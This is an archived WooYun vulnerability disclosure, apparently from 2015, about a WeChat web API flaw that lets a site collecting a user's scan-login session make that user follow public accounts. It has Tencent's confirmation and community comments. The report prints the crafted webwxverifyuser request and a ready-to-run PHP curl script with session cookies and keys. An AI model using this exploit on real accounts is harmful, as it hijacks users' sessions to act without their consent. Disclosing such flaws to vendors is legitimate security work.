{"id": 72347, "wybug_id": "wooyun-2015-0150266", "wybug_title": "微信强制用户关注公众号", "wybug_corp": "腾讯", "wybug_author": "莫里", "wybug_date": "2015-11-10 12:10", "wybug_open_date": "2015-12-26 16:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向公众公开  简要描述： 微信强制用户关注公众号 详细说明：  微信设计错误，可导致用户强制关注公众号漏洞内容：\t第一步测试 登陆微信网页版 之后转发一个微信公众号关注链接过来 找到接口 https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxverifyuser 之后点击加好友没有用 发现还是有参数传递的 强制关注如下，只要发送下面参数就可以了 https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxverifyuser?r=1444191154300 {\"BaseRequest\":{\"Uin\":（微信用户值）,\"Sid\":\"（微信用户值）\",\"Skey\":\"（微信用户值）\",\"DeviceID\":\"（微信用户值）\"},\"Opcode\":1,\"VerifyUserListSize\":1,\"VerifyUserList\":[{\"Value\":\"（公众号加密值）\",\"VerifyUserTicket\":\"（公众号加密值）\"}],\"VerifyContent\":\"我是（用户名）\",\"SceneListCount\":10,\"SceneList\":[33],\"skey\":\"（用户值）\"} （用户值） 全部都可以通过 微信扫描登录获取到，只要你扫描登录我网站就能让这个微信号强制关注公众号 （公众号加密值）这个接口获取 https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxsync?sid=（微信的用户值）&skey=（微信的用户值） 最后测试发现 https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxverifyuser?r=1444191154300 {\"BaseRequest\":{\"Uin\":（微信用户值）,\"Sid\":\"（微信用户值）\",\"Skey\":\"（微信用户值）\",\"DeviceID\":\"（微信用户值）\"},\"Opcode\":1,\"VerifyUserListSize\":1,\"VerifyUserList\":[{\"Value\":\"（公众号的微信号）\",\"VerifyUserTicket\":\"\"}],\"VerifyContent\":\"我是（用户名）\",\"SceneListCount\":10,\"SceneList\":[33],\"skey\":\"（用户值）\"} 强制关注条件如下 1.扫描登录我网站 2.知道要强制关注公众号的微信号用户值获取再强调一遍，网站接入微信扫描登录即可拿到，上面的用户值，确实有这个漏洞我经过测试一天，大概可以让一个微信号强制关注20个左右$header = array (    \t\t\t'Host: wx2.qq.com',\t\t\t'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',\t\t\t'Accept: application/json, text/plain, */*',\t\t\t'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',\t\t\t'Accept-Encoding: gzip, deflate',\t\t\t'DNT: 1',\t\t\t'Content-Type: application/json;charset=utf-8',\t\t\t'Referer: https://wx2.qq.com/',\t\t\t'Cookie: wxuin=2330616138; webwxuvid=cab5317930f5335a8994ade9a8160d9a0c1e843e1bd24ff03ab254c91d4ea3a8ec31a98c8d9adb6087cf6e9043d53c58; pgv_pvi=3286183936; pgv_pvid=8255006950; pgv_info=ssid=s2371423939; pgv_si=s1581726720; wxsid=hBgpWPQeDRDVm3Rc; wxloadtime=1444359620_expired; mm_lang=zh_CN; webwx_data_ticket=AQaRtHUZKZBvZZR2FeXCn5pg; MM_WX_NOTIFY_STATE=1; MM_WX_SOUND_STATE=1; wxpluginkey=1444352949',\t\t\t'Connection: keep-alive',\t\t\t );  \t\t\t $data='{\"BaseRequest\":{\"Uin\":2330616138,\"Sid\":\"hBgpWPQeDRDVm3Rc\",\"Skey\":\"@crypt_59f3b75a_83ef845caf0ab36ff0030430799256a4\",\"DeviceID\":\"e589828811516427\"},\"Opcode\":1,\"VerifyUserListSize\":1,\"VerifyUserList\":[{\"Value\":\"gopartygo\",\"VerifyUserTicket\":\"\"}],\"VerifyContent\":\"我是123456789\",\"SceneListCount\":1,\"SceneList\":[33],\"skey\":\"@crypt_59f3b75a_83ef845caf0ab36ff0030430799256a4\"}'; \t\t\t$ch = curl_init(\"http://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxverifyuser?r=1444361009023\"); \t\t\tcurl_setopt($ch, CURLOPT_HTTPHEADER, $header); \t\t\tcurl_setopt($ch, CURLOPT_HEADER, 1);  \t\t\tcurl_setopt ( $ch, CURLOPT_POST, 1 );\t\t\t\t\tcurl_setopt ( $ch, CURLOPT_POSTFIELDS, $data );\t\t\t\t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  \t\t\t$b=curl_exec($ch); \t\t\tcurl_close($ch);上面的是php代码，里面的用户值，你扫描登录微信网页版，你手动抓上去，运行就可以了这个补充够充分了吧！！！代码都发你了，图片我截图不了给你，视频倒是可以，我懒得拍   漏洞证明：  https://wx2.qq.com/cgi-bin/mmwebwx-bin/webwxverifyuser?r=1444191154300{\"BaseRequest\":{\"Uin\":2330616138,\"Sid\":\"Ix4w3k0gAVg1T5SW\",\"Skey\":\"@crypt_59f3b75a_a777b52ce96a1fa4850c7bad1661c296\",\"DeviceID\":\"e426131629909286\"},\"Opcode\":1,\"VerifyUserListSize\":1,\"VerifyUserList\":[{\"Value\":\"@888d1b21d2fe80dafe922ed50723874b\",\"VerifyUserTicket\":\"v1_92c7ceebbd2a799f06c7e5f97fd352c5c040d63b8c40ec055b6968f5068860d3@stranger\"}],\"VerifyContent\":\"我是123456789\",\"SceneListCount\":10,\"SceneList\":[33],\"skey\":\"@crypt_59f3b75a_a777b52ce96a1fa4850c7bad1661c296\"}   修复方案：  微信有大神不瞎说了   版权声明：转载请注明来源 莫里@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-11-11 16:50 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-11-11 16:56 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:267 漏洞数:20        | 当我又回首一切,这个世界会好吗?)\t\t \n  良心企业    \n     2015-11-11 17:04 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 哈！躁起来！)\t\t \n  良心企业    \n     2015-11-11 17:06 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:335 漏洞数:91        | http://www.tomatoyu.com/)\t\t \n  屌    \n     2015-11-11 17:16 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  6666    \n     2015-11-11 17:41 |    \t\tSecurity \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:12        )\t\t \n  <mark></mark>    \n     2015-11-11 17:51 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:180 漏洞数:60        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  良心企业    \n     2015-11-11 18:15 |    \t\t莫里 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:24        | )\t\t \n  @随风的风 为何都在说良心企业呢，另外rank有啥作用啊    \n     2015-11-11 20:13 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1240 漏洞数:262        | 爱生活、爱腾讯、爱网络！)\t\t \n  @莫里 rank可以在\"乌云集市\"兑换实物。1rank=1wb=10人民币    \n     2015-11-11 20:40 |    \t\t偶然 \t\t\t( 普通白帽子  |\t\t\t        Rank:164 漏洞数:44        | 我是天空里一片云。)\t\t \n  @莫里 12wb刚好可以买个跳蛋。    \n     2015-11-12 07:51 |    \t\tnick被注册 \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:25        | 天一)\t\t \n  业界良心    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}